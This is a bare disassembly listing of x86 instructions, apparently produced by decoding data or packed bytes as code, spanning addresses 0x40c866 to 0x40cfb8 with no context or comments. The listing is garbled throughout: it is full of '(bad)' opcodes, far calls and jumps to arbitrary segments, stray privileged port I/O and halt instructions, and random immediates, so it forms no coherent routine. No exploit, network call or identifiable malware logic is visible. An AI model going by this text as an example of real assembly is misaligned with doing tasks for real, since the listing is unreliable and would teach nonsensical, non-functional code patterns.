  40c866:	mov    al,0xde
  40c868:	pop    ecx
  40c869:	nop
  40c86a:	xor    eax,edi
  40c86c:	clc    
  40c86d:	(bad)  
  40c86e:	ds imul ebp,DWORD PTR ds:[edi+ebx*4+0x7018ee],0xffffffaf
  40c878:	scas   al,BYTE PTR es:[edi]
  40c879:	(bad)  
  40c87a:	repnz push 0x28
  40c87d:	push   0xd
  40c87f:	jp     0x40c83e
  40c881:	cs in  al,dx
  40c883:	sub    al,0x90
  40c885:	cwde   
  40c886:	retf   
  40c887:	add    ebp,DWORD PTR [eax]
  40c889:	xor    ch,BYTE PTR [esi+eax*8-0x7f1f0ae]
  40c890:	stos   DWORD PTR es:[edi],eax
  40c891:	push   ecx
  40c892:	rcl    BYTE PTR [ebp+ebp*4-0x20],1
  40c896:	add    dh,BYTE PTR [edi+ecx*4]
  40c899:	data16 adc BYTE PTR [edi+0x24],bl
  40c89d:	bound  ecx,QWORD PTR [esi+0x48db0aaa]
  40c8a3:	mov    WORD PTR [eax+0x3caea6dc],ds
  40c8a9:	aam    0x18
  40c8ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ac:	and    BYTE PTR [esi-0x14db576],0x58
  40c8b3:	clc    
  40c8b4:	ss std 
  40c8b6:	mov    BYTE PTR [ecx+ebx*8+0x6],dl
  40c8ba:	aad    0x49
  40c8bc:	jecxz  0x40c84e
  40c8be:	add    ah,cl
  40c8c0:	pop    ds
  40c8c1:	fdivr  QWORD PTR [edx+0x56ca14e8]
  40c8c7:	je     0x40c8ed
  40c8c9:	push   es
  40c8ca:	retf   0x6996
  40c8cd:	cli    
  40c8ce:	sub    BYTE PTR [ebp+0x522d5474],0x6a
  40c8d5:	or     BYTE PTR [ecx],dl
  40c8d7:	mul    DWORD PTR [edx*2+0x2fb4cfe4]
  40c8de:	push   esp
  40c8df:	je     0x40c895
  40c8e1:	mov    eax,ds:0xac5ac9a6
  40c8e6:	pop    eax
  40c8e7:	inc    edx
  40c8e8:	rcl    DWORD PTR [esi],0x15
  40c8eb:	xor    eax,0xe3565b32
  40c8f0:	and    BYTE PTR ds:0x6ff38285,dl
  40c8f6:	push   0xffffffb6
  40c8f8:	mov    dh,0xa7
  40c8fa:	nop
  40c8fb:	mov    dl,0x4c
  40c8fd:	sbb    eax,0xbe9f8e
  40c902:	jl     0x40c917
  40c904:	add    BYTE PTR [esi],bh
  40c906:	in     eax,0x15
  40c908:	popf   
  40c909:	ss push ebx
  40c90b:	inc    ebp
  40c90c:	cmp    dl,al
  40c90e:	popa   
  40c90f:	jno    0x40c95e
  40c911:	or     BYTE PTR [esi],ch
  40c913:	push   edx
  40c914:	inc    ecx
  40c915:	sub    DWORD PTR [ebp-0x7a],0x857c4a7b
  40c91c:	lds    esp,FWORD PTR [edx]
  40c91e:	pop    edx
  40c91f:	mov    al,ds:0x79a2a396
  40c924:	inc    ecx
  40c925:	ss or  al,0x86
  40c928:	cli    
  40c929:	add    BYTE PTR [edx-0x22],ch
  40c92c:	cmp    dl,BYTE PTR [eax-0x4a]
  40c92f:	test   eax,0xcae4a015
  40c934:	inc    eax
  40c935:	cld    
  40c936:	les    edx,FWORD PTR [edx-0x411d241e]
  40c93c:	sub    BYTE PTR [edx],dh
  40c93e:	xor    eax,DWORD PTR [ebp+0x2622fcc7]
  40c944:	push   esp
  40c945:	adc    DWORD PTR [edx+0x2466eb5a],ebp
  40c94b:	xchg   esp,eax
  40c94c:	adc    al,0xac
  40c94e:	mov    eax,ds:0x38244548
  40c953:	aam    0x86
  40c955:	add    dh,BYTE PTR [esi]
  40c957:	add    al,0xb6
  40c959:	sub    DWORD PTR [ebx],0xffffff8e
  40c95c:	inc    esp
  40c95d:	fcmovu st,st(6)
  40c95f:	call   0x5204:0x2ffab2ad
  40c966:	jecxz  0x40c9e4
  40c968:	dec    ebx
  40c969:	sti    
  40c96a:	add    BYTE PTR [edx+0x4ddbbfc4],dh
  40c970:	lods   eax,DWORD PTR ds:[esi]
  40c971:	imul   edx,DWORD PTR [edi],0x787ce8a0
  40c977:	jmp    0xa2d5:0x4ee2f394
  40c97e:	imul   ebp,DWORD PTR [ebx+0xa],0x8b6958de
  40c985:	retf   0x7711
  40c988:	into   
  40c989:	pop    eax
  40c98a:	aam    0xa2
  40c98c:	(bad)  
  40c98d:	outs   dx,BYTE PTR ds:[esi]
  40c98e:	jb     0x40c9e8
  40c990:	xchg   esp,eax
  40c991:	bound  ebx,QWORD PTR [esi-0x27]
  40c994:	retf   
  40c995:	pop    edx
  40c996:	inc    ebx
  40c997:	xchg   DWORD PTR [esi+eiz*2+0x3d],ecx
  40c99b:	outs   dx,BYTE PTR ds:[esi]
  40c99c:	mov    esi,edx
  40c99e:	xchg   esp,eax
  40c99f:	retf   0xac50
  40c9a2:	jo     0x40c9b9
  40c9a4:	and    al,0xca
  40c9a6:	repnz mov ?,esp
  40c9a9:	pop    esp
  40c9aa:	inc    eax
  40c9ab:	or     cl,BYTE PTR [edx]
  40c9ad:	call   0x2e16:0x613e5ead
  40c9b4:	and    eax,0x775a91ae
  40c9b9:	mov    fs,WORD PTR [ebx]
  40c9bb:	inc    ebx
  40c9bc:	sub    ebp,esi
  40c9be:	addr16 clc 
  40c9c0:	push   cs
  40c9c1:	and    BYTE PTR [eax-0x4b],cl
  40c9c4:	mov    eax,ds:0x2eb4d9a1
  40c9c9:	mov    BYTE PTR [esi-0x31481952],cl
  40c9cf:	add    eax,0x6b609195
  40c9d4:	push   esi
  40c9d5:	rol    BYTE PTR [edx+edi*8-0x6183f778],0xcb
  40c9dd:	lock into 
  40c9df:	ins    BYTE PTR es:[di],dx
  40c9e1:	sub    ch,BYTE PTR [esp+eax*2-0x62]
  40c9e5:	cs mov dl,0x57
  40c9e8:	lock pop ecx
  40c9ea:	test   al,0x15
  40c9ec:	adc    al,0xb5
  40c9ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ef:	pop    edx
  40c9f0:	pop    eax
  40c9f1:	sub    esi,0xffffff80
  40c9f4:	dec    edx
  40c9f5:	in     al,dx
  40c9f6:	ins    BYTE PTR es:[edi],dx
  40c9f7:	or     al,0xab
  40c9f9:	dec    ebx
  40c9fa:	mov    ah,0xab
  40c9fc:	call   0x6de5f612
  40ca01:	sbb    cl,BYTE PTR [esp+edx*1-0x52f2cb27]
  40ca08:	push   eax
  40ca09:	xor    edi,DWORD PTR [esi+ecx*1-0x2]
  40ca0d:	out    dx,al
  40ca0e:	jbe    0x40c9d2
  40ca10:	adc    DWORD PTR [ecx+0x41],esp
  40ca13:	push   ebp
  40ca14:	sbb    DWORD PTR [eax],0x6be42bd
  40ca1a:	jmp    DWORD PTR [ebx-0x53d52eb0]
  40ca20:	loopne 0x40ca82
  40ca22:	cs sbb dl,0xa
  40ca26:	push   ds
  40ca27:	mov    esi,0x26a6868c
  40ca2c:	pop    ebx
  40ca2d:	pusha  
  40ca2e:	inc    eax
  40ca2f:	cmp    dl,BYTE PTR [esi]
  40ca31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca32:	jo     0x40ca50
  40ca34:	popf   
  40ca35:	out    0xc9,al
  40ca37:	add    al,0xa2
  40ca39:	xchg   BYTE PTR [edi+0x4c4a28da],dl
  40ca3f:	sub    BYTE PTR [ebp+0x55],cl
  40ca42:	lods   eax,DWORD PTR ds:[esi]
  40ca43:	test   al,0x6a
  40ca45:	int3   
  40ca46:	outs   dx,BYTE PTR ds:[esi]
  40ca47:	pushw  ss
  40ca49:	push   ss
  40ca4a:	fmul   DWORD PTR [eax+0x61a034ca]
  40ca50:	or     DWORD PTR ds:0x3d4b0598,0x50
  40ca57:	pop    ss
  40ca58:	into   
  40ca59:	jns    0x40ca96
  40ca5b:	sbb    bl,BYTE PTR [edx-0x79]
  40ca5e:	dec    eax
  40ca5f:	mov    ds:0x9ef78eaa,al
  40ca64:	cld    
  40ca65:	test   BYTE PTR [eax+0x3c],0xf6
  40ca69:	scas   al,BYTE PTR es:[edi]
  40ca6a:	sub    ch,BYTE PTR [ebx+0x7c]
  40ca6d:	arpl   WORD PTR [edx+0x24],bp
  40ca70:	lods   al,BYTE PTR ds:[esi]
  40ca71:	xor    al,BYTE PTR [esi]
  40ca73:	mov    bh,0x0
  40ca75:	and    ch,al
  40ca77:	adc    eax,0x3b8eb638
  40ca7c:	mov    ah,0x83
  40ca7e:	inc    esi
  40ca7f:	ins    DWORD PTR es:[edi],dx
  40ca80:	in     eax,dx
  40ca81:	rcl    BYTE PTR [edx],0x3
  40ca84:	fwait
  40ca85:	pop    edi
  40ca86:	mov    cl,0xa2
  40ca88:	push   edx
  40ca89:	std    
  40ca8a:	jo     0x40ca10
  40ca8c:	test   esp,eax
  40ca8e:	xchg   esi,eax
  40ca8f:	add    cl,dh
  40ca91:	js     0x40ca93
  40ca93:	clc    
  40ca94:	jno    0x40cadd
  40ca96:	inc    edx
  40ca97:	mov    al,0xe3
  40ca99:	sbb    DWORD PTR [edx-0xa2ce7bf],ecx
  40ca9f:	dec    esi
  40caa0:	outs   dx,BYTE PTR ds:[esi]
  40caa1:	inc    ebx
  40caa2:	int    0xbf
  40caa4:	cli    
  40caa5:	es ret 
  40caa7:	add    BYTE PTR [ebp-0x11dfffa6],ah
  40caad:	dec    ecx
  40caae:	cmp    al,0x1b
  40cab0:	add    al,0x5
  40cab2:	sbb    eax,0x2d60d1ae
  40cab7:	push   esp
  40cab8:	push   0xd147dc4a
  40cabd:	mov    ah,BYTE PTR [esi-0x6c]
  40cac0:	hlt    
  40cac1:	int3   
  40cac2:	hlt    
  40cac3:	xchg   ebx,eax
  40cac4:	(bad)  
  40cac7:	pop    edx
  40cac8:	push   ecx
  40cac9:	lods   eax,DWORD PTR gs:[esi]
  40cacb:	jns    0x40cb21
  40cacd:	add    BYTE PTR [edx],bh
  40cacf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cad0:	les    edi,FWORD PTR fs:[ebx]
  40cad3:	mov    BYTE PTR [esi+eiz*2],ah
  40cad6:	fisub  DWORD PTR [esi-0x28]
  40cad9:	aad    0x78
  40cadb:	in     al,dx
  40cadc:	xchg   BYTE PTR ds:0x56a00e83,al
  40cae2:	fimul  DWORD PTR [eax+0x143455f3]
  40cae8:	mov    ah,dl
  40caea:	mov    ds:0x10735ccb,al
  40caef:	mov    ah,BYTE PTR [ebx-0x5b8a5760]
  40caf5:	xor    eax,0x46c898a6
  40cafa:	mov    WORD PTR [edx-0x5452b27e],?
  40cb00:	add    al,dl
  40cb02:	jp     0x40cb61
  40cb04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb05:	and    ebx,esp
  40cb07:	rcl    dh,0x6
  40cb0a:	push   cs
  40cb0b:	repz dec ebp
  40cb0d:	add    eax,0xb616c8de
  40cb12:	add    DWORD PTR [eax],0x57211af
  40cb18:	dec    ebp
  40cb19:	or     DWORD PTR [edx-0x1b59650f],0x40
  40cb20:	adc    esp,DWORD PTR [esi+0x62]
  40cb23:	sbb    eax,0xde054505
  40cb28:	add    ah,BYTE PTR fs:[esi+ecx*2]
  40cb2c:	cmp    DWORD PTR [eax+0x6cd11f8d],edx
  40cb32:	inc    ebp
  40cb33:	dec    edx
  40cb34:	outs   dx,DWORD PTR ds:[esi]
  40cb35:	sub    BYTE PTR [ecx+esi*8],bh
  40cb38:	lods   eax,DWORD PTR ds:[esi]
  40cb39:	cmp    bh,BYTE PTR [ebx]
  40cb3b:	mov    ebx,0xac1a33
  40cb40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb41:	dec    ebp
  40cb42:	lods   al,BYTE PTR ds:[esi]
  40cb43:	cmp    BYTE PTR [ebx+0x4cd6c5c0],0x45
  40cb4a:	sti    
  40cb4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4c:	xchg   esp,eax
  40cb4d:	jl     0x40cba8
  40cb4f:	sbb    al,0x60
  40cb51:	fbld   TBYTE PTR [edx+ebp*1+0x1a]
  40cb55:	call   0x940e:0x800ee79
  40cb5c:	mov    es,WORD PTR [edx]
  40cb5e:	xchg   esi,eax
  40cb5f:	mov    ?,WORD PTR [ecx]
  40cb61:	add    eax,0xeedf3366
  40cb66:	dec    cl
  40cb68:	add    BYTE PTR [eax-0x3000e3e4],ch
  40cb6e:	push   es
  40cb6f:	callw  0x80a3
  40cb73:	pop    ebp
  40cb74:	adc    al,0x57
  40cb76:	psrad  mm3,QWORD PTR [ebp+0x3aa4f0e8]
  40cb7d:	pop    edx
  40cb7e:	stos   DWORD PTR es:[edi],eax
  40cb7f:	call   0xe26ed51a
  40cb84:	xchg   esp,eax
  40cb85:	and    DWORD PTR [eax],ebp
  40cb87:	jbe    0x40cb0d
  40cb89:	inc    edi
  40cb8a:	mov    fs,WORD PTR [esi-0x58a1652a]
  40cb90:	call   0x1eac:0xf41af4b6
  40cb97:	push   esp
  40cb98:	adc    BYTE PTR [edi],0xd8
  40cb9b:	ss push edx
  40cb9d:	mov    dl,0x84
  40cb9f:	push   eax
  40cba0:	xor    al,0x0
  40cba2:	out    0xb2,al
  40cba4:	jle    0x40cb34
  40cba6:	mov    al,BYTE PTR [esi+0x4c110e56]
  40cbac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbad:	mov    WORD PTR [edx],es
  40cbaf:	(bad)  
  40cbb1:	push   ds
  40cbb2:	adc    eax,0x42c50ad8
  40cbb7:	ret    0x765e
  40cbba:	fadd   QWORD PTR [ecx+0x75127816]
  40cbc0:	push   ebp
  40cbc1:	xor    eax,0x3244f654
  40cbc6:	xor    al,0x9c
  40cbc8:	(bad)  [eax+0x18]
  40cbcb:	mov    al,ds:0xbea2aaa9
  40cbd0:	mov    esi,0x3aaee47c
  40cbd5:	mov    al,ds:0xd668ef23
  40cbda:	mov    al,0x66
  40cbdc:	mov    DWORD PTR [ebp-0x62],esi
  40cbdf:	or     BYTE PTR [esi],dl
  40cbe1:	adc    BYTE PTR [eax+0x771ad2],ch
  40cbe7:	xchg   BYTE PTR ds:0x74987534,dh
  40cbed:	push   es
  40cbee:	add    edx,DWORD PTR [edx-0x25]
  40cbf1:	xchg   BYTE PTR [eax-0x50],bh
  40cbf4:	lods   eax,DWORD PTR ds:[esi]
  40cbf5:	test   eax,0x789070a3
  40cbfa:	and    BYTE PTR [edx],bh
  40cbfc:	mov    eax,0xcac5c8a0
  40cc01:	sub    ch,BYTE PTR [eax-0x1ddb1716]
  40cc07:	xor    BYTE PTR [eax+ebx*8-0x7c],ch
  40cc0b:	pop    edx
  40cc0c:	cwde   
  40cc0d:	shr    BYTE PTR [ebp+ebp*2+0x3e2bece8],1
  40cc14:	cli    
  40cc15:	mov    al,ds:0x76ac556a
  40cc1a:	and    DWORD PTR [edx],ecx
  40cc1c:	add    al,0x1b
  40cc1e:	or     dl,BYTE PTR [edx-0x57]
  40cc21:	sahf   
  40cc22:	mov    dl,0x35
  40cc24:	scas   al,BYTE PTR es:[edi]
  40cc25:	pop    edx
  40cc26:	xchg   esi,eax
  40cc27:	fldcw  WORD PTR [edx-0x27ad6cfe]
  40cc2d:	loopne 0x40cc25
  40cc2f:	jbe    0x40cc9c
  40cc31:	jo     0x40cc3f
  40cc33:	test   eax,0xcf34aaab
  40cc38:	div    BYTE PTR [edx+esi*1-0x52b29491]
  40cc3f:	inc    eax
  40cc40:	inc    edx
  40cc41:	js     0x40cc67
  40cc43:	loop   0x40cc22
  40cc45:	dec    esp
  40cc46:	pop    ss
  40cc47:	and    cl,BYTE PTR [eax+0x6cd6b682]
  40cc4d:	inc    ecx
  40cc4e:	dec    ecx
  40cc4f:	sbb    BYTE PTR [ecx-0x9553b3],bl
  40cc55:	push   ss
  40cc56:	fwait
  40cc57:	(bad)  
  40cc58:	sub    al,0x1d
  40cc5a:	sbb    eax,0xa6575d
  40cc5f:	dec    esp
  40cc60:	and    al,dh
  40cc62:	push   ds
  40cc63:	outs   dx,BYTE PTR ds:[esi]
  40cc64:	push   0xffffffb2
  40cc66:	inc    esi
  40cc67:	or     bl,dl
  40cc69:	mov    bl,0x76
  40cc6b:	mov    esi,0xa8ea284e
  40cc70:	sub    BYTE PTR [eax+0x54],ch
  40cc73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc74:	popa   
  40cc75:	test   WORD PTR [esi+eax*8-0x53ad9edc],cx
  40cc7d:	fs push eax
  40cc7f:	out    dx,eax
  40cc80:	mov    cs,WORD PTR [ebp+edx*1-0x68]
  40cc84:	outs   dx,DWORD PTR ds:[esi]
  40cc85:	stos   BYTE PTR es:[edi],al
  40cc86:	sub    BYTE PTR [ecx+0x34],dl
  40cc89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc8a:	and    DWORD PTR [eax],eax
  40cc8c:	cmp    cl,BYTE PTR [ebp+0x55550996]
  40cc92:	xor    al,0x74
  40cc94:	aam    0xc5
  40cc96:	(bad)  
  40cc98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc99:	pop    esp
  40cc9a:	cmp    al,0xe6
  40cc9c:	sbb    eax,0x40a0a1b6
  40cca1:	xor    al,0x48
  40cca3:	xor    DWORD PTR [eax+eiz*2-0x166fc572],ecx
  40ccaa:	xchg   ebx,eax
  40ccab:	sub    eax,0x9ea45d68
  40ccb0:	retf   0x7e90
  40ccb3:	push   cs
  40ccb4:	je     0x40cd1a
  40ccb6:	loop   0x40cccd
  40ccb8:	sbb    ebp,DWORD PTR [ecx+edx*2-0x68]
  40ccbc:	adc    al,0x74
  40ccbe:	jecxz  0x40cc42
  40ccc0:	jp     0x40cc56
  40ccc2:	jge    0x40cd22
  40ccc4:	inc    ebx
  40ccc5:	or     cl,BYTE PTR [edx+0x7e541c0a]
  40cccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cccc:	cwde   
  40cccd:	jo     0x40cc95
  40cccf:	inc    edi
  40ccd0:	aam    0xd1
  40ccd2:	sbb    cl,BYTE PTR [edx]
  40ccd4:	pop    edx
  40ccd5:	xor    al,BYTE PTR [edx]
  40ccd7:	mul    BYTE PTR [esp+ebp*8-0x7c]
  40ccdb:	ftst   
  40ccdd:	fcom   DWORD PTR [eax-0x2b]
  40cce0:	sub    BYTE PTR ds:0xd5d443f6,bh
  40cce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cce7:	add    BYTE PTR [edx-0x4b],al
  40ccea:	sar    DWORD PTR [edx],0x36
  40cced:	clc    
  40ccee:	mov    cs,eax
  40ccf0:	(bad)  
  40ccf2:	nop
  40ccf3:	shl    DWORD PTR ds:0xa716a8b0,cl
  40ccf9:	aam    0xa3
  40ccfb:	sub    eax,0xd1fa92e4
  40cd00:	gs pop ebx
  40cd02:	push   ebp
  40cd03:	and    bh,ah
  40cd05:	(bad)  
  40cd06:	cmp    BYTE PTR [ebx],0x29
  40cd09:	mov    esi,0xd55950b6
  40cd0e:	push   esi
  40cd0f:	push   ecx
  40cd10:	loop   0x40ccfa
  40cd12:	call   0x6d8:0x36d33a10
  40cd19:	jbe    0x40ccbe
  40cd1b:	test   eax,0x9352a3ab
  40cd20:	push   ds
  40cd21:	mov    esp,0xc7dc5ece
  40cd26:	ret    
  40cd27:	lods   al,BYTE PTR ds:[si]
  40cd29:	cli    
  40cd2a:	mov    cx,0x5800
  40cd2e:	in     al,0x41
  40cd30:	pop    ss
  40cd31:	jmp    0xbb6:0xaaa886d
  40cd38:	ss mov esi,0xeade488d
  40cd3e:	add    BYTE PTR ds:0x54b50976,cl
  40cd44:	hlt    
  40cd45:	stos   DWORD PTR es:[edi],eax
  40cd46:	stos   BYTE PTR es:[edi],al
  40cd47:	test   al,0xc3
  40cd49:	call   0xc6c0:0xbf3eddf0
  40cd50:	mov    ch,0xa8
  40cd52:	mov    al,ds:0x3a45aaa2
  40cd57:	xchg   edi,eax
  40cd58:	fimul  WORD PTR [edx]
  40cd5a:	(bad)  
  40cd5b:	icebp  
  40cd5c:	jb     0x40cd8a
  40cd5e:	enter  0x1ed1,0x18
  40cd62:	gs out dx,al
  40cd64:	sbb    ecx,DWORD PTR [eax+ebp*1]
  40cd67:	pop    eax
  40cd68:	fist   DWORD PTR [eax+0x4]
  40cd6b:	fidiv  DWORD PTR [eax+0x54405a0e]
  40cd71:	cli    
  40cd72:	xor    dh,BYTE PTR [ebp+0x2e164d45]
  40cd78:	daa    
  40cd79:	sub    al,0xe6
  40cd7b:	or     bh,BYTE PTR [esp+ebx*4-0x66]
  40cd7f:	xor    BYTE PTR [ebp+0x1dc46868],ch
  40cd85:	cmp    BYTE PTR [eax-0x5800836],ah
  40cd8b:	or     bl,BYTE PTR [edx+0x7d8668ed]
  40cd91:	nop
  40cd92:	fsubr  st(1),st
  40cd94:	adc    al,dl
  40cd96:	lods   al,BYTE PTR ds:[esi]
  40cd97:	jb     0x40cd8c
  40cd99:	imul   ebp,eax,0x5a
  40cd9c:	rcl    BYTE PTR [eax],1
  40cd9e:	pop    es
  40cd9f:	sbb    cl,bh
  40cda1:	add    eax,0x7402aeb0
  40cda6:	ror    BYTE PTR [edi-0x45fd7d7a],1
  40cdac:	jmp    0x369c:0xe4141e54
  40cdb3:	mov    ch,0xf6
  40cdb5:	mov    WORD PTR [esi],ss
  40cdb7:	ss cli 
  40cdb9:	loop   0x40cdd0
  40cdbb:	push   ss
  40cdbc:	ror    BYTE PTR [eax+ebx*2+0x27],1
  40cdc0:	push   ss
  40cdc1:	scas   al,BYTE PTR es:[edi]
  40cdc2:	adc    eax,0x395246cd
  40cdc7:	adc    BYTE PTR [edi-0x1cfb55e6],ah
  40cdcd:	sub    ebx,DWORD PTR [edx]
  40cdcf:	cmp    dl,BYTE PTR [esi+ebx*8-0x4a]
  40cdd3:	les    ecx,FWORD PTR [eax+0x7b006fe9]
  40cdd9:	data16 mov dl,0xcd
  40cddc:	ds test eax,0x55834c0
  40cde2:	and    BYTE PTR [eax+0xa],al
  40cde5:	cld    
  40cde6:	imul   esi,DWORD PTR [edx+ebx*4],0xa
  40cdea:	pop    edx
  40cdeb:	imul   edx,esi,0xffffff9b
  40cdee:	loop   0x40ce07
  40cdf0:	mov    al,ds:0x2e137e11
  40cdf5:	xchg   ebp,eax
  40cdf6:	pop    edx
  40cdf7:	ret    
  40cdf8:	add    bl,bl
  40cdfa:	inc    eax
  40cdfb:	aas    
  40cdfc:	dec    eax
  40cdfd:	push   edx
  40cdfe:	cld    
  40cdff:	mov    ch,BYTE PTR [esi+ebp*2-0x66]
  40ce03:	jbe    0x40ce0b
  40ce05:	mov    edx,DWORD PTR [ebx+ebp*2+0x1a]
  40ce09:	mov    WORD PTR [esi],ss
  40ce0b:	bound  ebx,QWORD PTR [esi+0x30]
  40ce0e:	test   al,0xd9
  40ce10:	push   es
  40ce11:	xchg   ebp,eax
  40ce12:	push   cs
  40ce13:	xor    BYTE PTR [esi],cl
  40ce15:	push   esi
  40ce16:	push   eax
  40ce17:	sbb    al,0x34
  40ce19:	adc    ah,BYTE PTR [eax+0x68ad8012]
  40ce1f:	cmc    
  40ce20:	fadd   st(2),st
  40ce22:	cmp    BYTE PTR ds:[edx],ch
  40ce25:	js     0x40cdee
  40ce27:	xor    DWORD PTR [eax],0xffffffd2
  40ce2a:	in     al,0x8d
  40ce2c:	cli    
  40ce2d:	add    cl,al
  40ce2f:	(bad)  
  40ce31:	fs sbb eax,0x241ea9b6
  40ce37:	aad    0xd6
  40ce39:	cs scas al,BYTE PTR es:[edi]
  40ce3b:	outs   dx,BYTE PTR ds:[esi]
  40ce3c:	fsubr  QWORD PTR [eax+0x28]
  40ce3f:	test   al,0xb0
  40ce41:	hlt    
  40ce42:	and    dh,BYTE PTR [eax]
  40ce44:	js     0x40ce26
  40ce46:	sbb    cl,al
  40ce48:	mov    cl,0xc1
  40ce4a:	sub    al,0x60
  40ce4c:	leave  
  40ce4d:	inc    edi
  40ce4e:	xor    dl,BYTE PTR [ebx-0x2]
  40ce51:	cmp    al,0xa8
  40ce53:	sub    dh,BYTE PTR [eax+0x14]
  40ce56:	dec    eax
  40ce57:	fisttp DWORD PTR [esi-0x10]
  40ce5a:	jbe    0x40ce8c
  40ce5c:	in     al,0x98
  40ce5e:	mov    eax,ds:0x8a0448ed
  40ce64:	sbb    al,0x30
  40ce66:	sahf   
  40ce67:	scas   al,BYTE PTR es:[edi]
  40ce68:	push   ds
  40ce69:	sar    BYTE PTR [edx],1
  40ce6b:	push   esi
  40ce6c:	je     0x40cec3
  40ce6e:	shl    BYTE PTR [ecx-0x74],1
  40ce71:	clc    
  40ce72:	inc    esi
  40ce73:	xlat   BYTE PTR ds:[ebx]
  40ce74:	ins    DWORD PTR es:[edi],dx
  40ce75:	cld    
  40ce76:	xchg   edx,eax
  40ce77:	leave  
  40ce78:	push   esi
  40ce79:	adc    al,0x19
  40ce7b:	pop    esp
  40ce7c:	xor    al,al
  40ce7e:	mov    dl,0xe0
  40ce80:	push   cs
  40ce81:	shr    BYTE PTR [eax-0x50],1
  40ce84:	lods   eax,DWORD PTR ds:[esi]
  40ce85:	test   al,0x6a
  40ce87:	adc    edx,eax
  40ce89:	fwait
  40ce8a:	hlt    
  40ce8b:	adc    al,0x3a
  40ce8d:	mov    BYTE PTR [eax+0x7a],ch
  40ce90:	(bad)  
  40ce91:	call   0xad20:0x26fcec5a
  40ce98:	loope  0x40ce5e
  40ce9a:	lods   eax,DWORD PTR ds:[esi]
  40ce9b:	call   0xc335:0xb0d010d4
  40cea2:	xchg   ebx,eax
  40cea3:	and    al,0x92
  40cea5:	cs push 0x9e456c3a
  40ceab:	(bad)  
  40ceac:	sub    eax,0x7081e080
  40ceb1:	cmp    eax,ecx
  40ceb3:	data16 sub BYTE PTR [edi-0x18],ah
  40ceb7:	mov    ds:0xf4975abd,al
  40cebc:	pop    esp
  40cebd:	add    BYTE PTR [eax+0x16],bl
  40cec0:	and    ah,dh
  40cec2:	adc    eax,0xb037db61
  40cec7:	pop    esi
  40cec8:	or     ebx,DWORD PTR [ebx+0x74]
  40cecb:	(bad)  
  40cecc:	push   edx
  40cecd:	dec    edi
  40cece:	hlt    
  40cecf:	adc    BYTE PTR [ebx-0x3d],bl
  40ced2:	or     ebx,DWORD PTR [esi-0x30]
  40ced5:	test   BYTE PTR [eax-0x40215000],dl
  40cedb:	in     al,dx
  40cedc:	add    BYTE PTR [ebx+0x6910555c],ch
  40cee2:	adc    esi,DWORD PTR [esp+esi*1-0x25]
  40cee6:	sbb    al,0x0
  40cee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cee9:	jno    0x40cedb
  40ceeb:	dec    esp
  40ceec:	push   edx
  40ceed:	push   esi
  40ceee:	fdiv   DWORD PTR [esi-0x2a]
  40cef1:	mov    esi,0xbe225689
  40cef6:	mov    ds:0x39141656,al
  40cefb:	add    BYTE PTR [ebp+0x63],dh
  40cefe:	push   edx
  40ceff:	add    dl,al
  40cf01:	mov    bl,0x5
  40cf03:	mov    dh,0xe1
  40cf05:	mov    eax,DWORD PTR [eax]
  40cf07:	pushf  
  40cf08:	inc    esp
  40cf09:	dec    esp
  40cf0a:	push   cs
  40cf0b:	pop    esi
  40cf0c:	cmp    al,0x19
  40cf0e:	xchg   ecx,eax
  40cf0f:	mov    BYTE PTR [eax+0x6d1c0b64],bh
  40cf15:	mov    al,0x5
  40cf17:	xor    al,0x4c
  40cf19:	pushf  
  40cf1a:	lods   al,BYTE PTR ss:[esi]
  40cf1c:	push   edx
  40cf1d:	call   0x521f89f8
  40cf22:	sbb    dl,BYTE PTR [esp+ebp*2-0x26]
  40cf26:	inc    esp
  40cf27:	add    bh,ch
  40cf29:	xor    al,bh
  40cf2b:	adc    BYTE PTR [edx-0x557d5148],bl
  40cf31:	xchg   BYTE PTR [ecx],ah
  40cf33:	push   cs
  40cf34:	neg    BYTE PTR [ebp+edi*8-0x4f55855e]
  40cf3b:	mov    al,ds:0x12e4c745
  40cf40:	push   es
  40cf41:	hlt    
  40cf42:	lds    esp,FWORD PTR [edx-0x3a]
  40cf45:	add    al,0xeb
  40cf47:	in     eax,dx
  40cf48:	jo     0x40cefe
  40cf4a:	int    0x14
  40cf4c:	mov    BYTE PTR [ebp+0x1e842efc],ch
  40cf52:	xchg   esi,eax
  40cf53:	push   0x42e86bfe
  40cf58:	xchg   edx,edi
  40cf5a:	push   esp
  40cf5b:	xor    eax,esi
  40cf5d:	out    0x86,al
  40cf5f:	into   
  40cf60:	jl     0x40cf0c
  40cf62:	mov    dh,0xc0
  40cf64:	ss call 0xa8693b53
  40cf6a:	repnz scas eax,DWORD PTR es:[edi]
  40cf6c:	mov    eax,0x8e5d2432
  40cf71:	inc    ebp
  40cf72:	mov    ?,WORD PTR [ebp-0x4345c1a6]
  40cf78:	(bad)  
  40cf79:	es in  eax,dx
  40cf7b:	mov    ch,0x1d
  40cf7d:	add    eax,0x42a00005
  40cf82:	rol    BYTE PTR [eax+eiz*2-0x4ebd6bd6],0xc1
  40cf8a:	ss aaa 
  40cf8c:	inc    esi
  40cf8d:	daa    
  40cf8e:	add    al,dh
  40cf90:	inc    edi
  40cf91:	push   ds
  40cf92:	and    bl,BYTE PTR [esi-0x491e2891]
  40cf98:	mov    eax,ds:0x41fefa41
  40cf9d:	bound  edi,QWORD PTR [edi+0xb76aa5]
  40cfa3:	aaa    
  40cfa4:	int    0xb1
  40cfa6:	mov    ds:0x129e0ea0,al
  40cfab:	xor    DWORD PTR [esi],edx
  40cfad:	xchg   esp,eax
  40cfae:	dec    esi
  40cfaf:	jmp    0x1d45:0xb40284e2
  40cfb6:	mov    dl,BYTE PTR [edi]
  40cfb8:	outs   dx,BYTE PTR ds:[esi]
